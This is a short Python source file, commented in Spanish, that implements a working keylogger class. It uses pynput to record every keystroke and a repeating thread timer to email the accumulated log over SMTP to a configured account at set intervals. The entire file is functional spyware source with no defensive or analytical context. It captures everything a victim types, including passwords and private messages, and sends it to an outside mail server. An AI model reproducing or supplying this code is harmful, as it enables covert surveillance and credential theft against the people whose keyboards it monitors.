import pynput.keyboard
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


class Keylogger:

    def __init__(self, time_interval, email, password, server, port):
        self.log = ""
        self.interval = time_interval
        self.email = email
        self.password = password
        self.smtp_server = server
        self.port = port

    def append_to_log(self, string):
        self.log += string
    

    # funcion que se ejecuta al presionar una tecla, graba en un archivo log el resultado
    def on_press(self, key):
        try:
            current_key = key.char
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        
        self.append_to_log(current_key)
        

    def report(self):
        if self.log:    # verifica si el log no esta vacio
            self.send_mail(self.email, self.password, self.log)
            self.log = ""      # reinicia el log luego de enviarlo
        
        timer = threading.Timer(self.interval, self.report)     # corro la funcion report cada n seg en otro hilo 
        timer.start()


    def send_mail(self, email, password, message):
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = email
        msg['Subject'] = "Keylogger report"
        
        msg.attach(MIMEText(message, 'plain'))

        server = smtplib.SMTP(self.smtp_server, self.port)
        server.starttls()
        server.login(user = email, password = password)
        server.send_message(msg)
        # server.sendmail(from_addr = email, to_addrs = email, msg = message)
        server.quit()


    def start(self):
        # creo un keyboard listener y lo pongo en escucha
        listener = pynput.keyboard.Listener(on_press = self.on_press)
        with listener:
            self.report()
            listener.join()
